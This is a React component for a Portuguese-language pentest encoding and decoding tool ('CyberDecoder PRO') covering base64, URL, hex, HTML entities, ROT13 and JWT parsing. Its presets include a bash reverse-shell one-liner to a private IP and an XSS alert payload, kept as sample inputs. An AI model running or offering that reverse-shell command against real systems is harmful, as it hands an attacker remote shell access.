// cloudos-frontend/src/apps/CyberDecoderApp.jsx
// CyberDecoder PRO - Suíte Tática de Codificação, Decodificação e Hashing para Pentest (CyberChef Lite)

import React, { useState, useCallback } from 'react';
import './CyberDecoderApp.css';

const OPERATIONS = [
  { id: 'base64_enc', name: 'Base64 Encode', category: 'Encoding', icon: '🔒' },
  { id: 'base64_dec', name: 'Base64 Decode', category: 'Encoding', icon: '🔓' },
  { id: 'url_enc', name: 'URL Encode', category: 'Encoding', icon: '🌐' },
  { id: 'url_dec', name: 'URL Decode', category: 'Encoding', icon: '🌐' },
  { id: 'hex_enc', name: 'Hex Encode', category: 'Encoding', icon: '🔢' },
  { id: 'hex_dec', name: 'Hex Decode', category: 'Encoding', icon: '🔢' },
  { id: 'html_enc', name: 'HTML Entity Encode', category: 'Encoding', icon: '🏷️' },
  { id: 'html_dec', name: 'HTML Entity Decode', category: 'Encoding', icon: '🏷️' },
  { id: 'rot13', name: 'ROT13 Cipher', category: 'Cifra', icon: '🔄' },
  { id: 'jwt_decode', name: 'JWT Parser / Decoder', category: 'Tokens', icon: '🔑' },
];

const PRESETS = [
  { name: 'Payload Base64 Linux', input: 'bash -i >& /dev/tcp/10.10.10.10/4444 0>&1', op: 'base64_enc' },
  { name: 'XSS URL Encoded', input: '<script>alert("CloudOS XSS")</script>', op: 'url_enc' },
  { name: 'JWT Sample Token', input: 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkFkbWluIE9wZXJhdG9yIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c', op: 'jwt_decode' },
  { name: 'Hex Shellcode', input: '436c6f75644f532050656e74657374204672616d65776f726b', op: 'hex_dec' }
];

export const CyberDecoderApp = () => {
  const [input, setInput] = useState('');
  const [output, setOutput] = useState('');
  const [operation, setOperation] = useState('base64_enc');
  const [statusMsg, setStatusMsg] = useState('');

  // Executar transformação
  const processTransform = useCallback((text, opId) => {
    if (!text) {
      setOutput('');
      return;
    }
    try {
      let result = '';
      switch (opId) {
        case 'base64_enc':
          result = btoa(unescape(encodeURIComponent(text)));
          break;
        case 'base64_dec':
          result = decodeURIComponent(escape(atob(text.trim())));
          break;
        case 'url_enc':
          result = encodeURIComponent(text);
          break;
        case 'url_dec':
          result = decodeURIComponent(text);
          break;
        case 'hex_enc':
          result = Array.from(new TextEncoder().encode(text))
            .map(b => b.toString(16).padStart(2, '0'))
            .join(' ');
          break;
        case 'hex_dec':
          const cleanHex = text.replace(/[^0-9a-fA-F]/g, '');
          const bytes = new Uint8Array(cleanHex.match(/.{1,2}/g)?.map(byte => parseInt(byte, 16)) || []);
          result = new TextDecoder().decode(bytes);
          break;
        case 'html_enc':
          result = text.replace(/[\u00A0-\u9999<>&"']/g, i => `&#${i.charCodeAt(0)};`);
          break;
        case 'html_dec':
          const doc = new DOMParser().parseFromString(text, 'text/html');
          result = doc.documentElement.textContent || '';
          break;
        case 'rot13':
          result = text.replace(/[a-zA-Z]/g, c =>
            String.fromCharCode((c <= 'Z' ? 90 : 122) >= (c = c.charCodeAt(0) + 13) ? c : c - 26)
          );
          break;
        case 'jwt_decode':
          const parts = text.trim().split('.');
          if (parts.length < 2) throw new Error('Token JWT inválido (esperado 3 partes separadas por ponto).');
          const header = JSON.parse(atob(parts[0]));
          const payload = JSON.parse(atob(parts[1]));
          result = `=== HEADER ===\n${JSON.stringify(header, null, 2)}\n\n=== PAYLOAD ===\n${JSON.stringify(payload, null, 2)}`;
          break;
        default:
          result = text;
      }
      setOutput(result);
      setStatusMsg('');
    } catch (err) {
      setOutput('');
      setStatusMsg(`❌ Erro de processamento: ${err.message}`);
    }
  }, []);

  const handleInputChange = (val) => {
    setInput(val);
    processTransform(val, operation);
  };

  const handleOpChange = (opId) => {
    setOperation(opId);
    processTransform(input, opId);
  };

  const handlePreset = (preset) => {
    setInput(preset.input);
    setOperation(preset.op);
    processTransform(preset.input, preset.op);
  };

  const copyOutput = () => {
    if (!output) return;
    navigator.clipboard.writeText(output);
    setStatusMsg('📋 Resultado copiado para a área de transferência!');
    setTimeout(() => setStatusMsg(''), 3000);
  };

  const swapInputOutput = () => {
    if (!output) return;
    setInput(output);
    processTransform(output, operation);
  };

  return (
    <div className="cyber-decoder-container">
      {/* Header */}
      <div className="cd-header">
        <div className="cd-title">
          <span className="cd-icon">🧪</span>
          <h3>CyberDecoder PRO</h3>
          <span className="cd-badge">CyberChef Lite</span>
        </div>
        <div className="cd-presets">
          <span className="cd-preset-label">Presets Táticos:</span>
          {PRESETS.map((p, i) => (
            <button key={i} className="cd-btn-preset" onClick={() => handlePreset(p)}>
              {p.name}
            </button>
          ))}
        </div>
      </div>

      {/* Operações Selector */}
      <div className="cd-ops-bar">
        {OPERATIONS.map(op => (
          <button
            key={op.id}
            className={`cd-op-btn ${operation === op.id ? 'active' : ''}`}
            onClick={() => handleOpChange(op.id)}
          >
            <span>{op.icon}</span> {op.name}
          </button>
        ))}
      </div>

      {/* Main Split Panels */}
      <div className="cd-main">
        {/* Input Panel */}
        <div className="cd-panel">
          <div className="cd-panel-header">
            <span>📥 Texto / Payload de Entrada</span>
            <button className="cd-btn-subtle" onClick={() => handleInputChange('')}>🧹 Limpar</button>
          </div>
          <textarea
            className="cd-textarea"
            value={input}
            onChange={e => handleInputChange(e.target.value)}
            placeholder="Cole aqui o texto, hash, URL ou token JWT para transformar..."
            rows={10}
          />
        </div>

        {/* Action Controls */}
        <div className="cd-mid-actions">
          <button className="cd-action-btn" onClick={swapInputOutput} title="Usar Saída como Entrada">
            🔁
          </button>
        </div>

        {/* Output Panel */}
        <div className="cd-panel">
          <div className="cd-panel-header">
            <span>📤 Resultado Transformado</span>
            <button className="cd-btn-subtle cd-btn-copy" onClick={copyOutput} disabled={!output}>
              📋 Copiar
            </button>
          </div>
          <textarea
            className="cd-textarea cd-output"
            value={output}
            readOnly
            placeholder="O resultado codificado/decodificado aparecerá aqui instantaneamente..."
            rows={10}
          />
        </div>
      </div>

      {/* Status Bar */}
      <div className="cd-statusbar">
        <span>Tamanho Entrada: {input.length} chars</span>
        <span>Tamanho Saída: {output.length} chars</span>
        {statusMsg && <span className="cd-status-msg">{statusMsg}</span>}
      </div>
    </div>
  );
};

export default CyberDecoderApp;
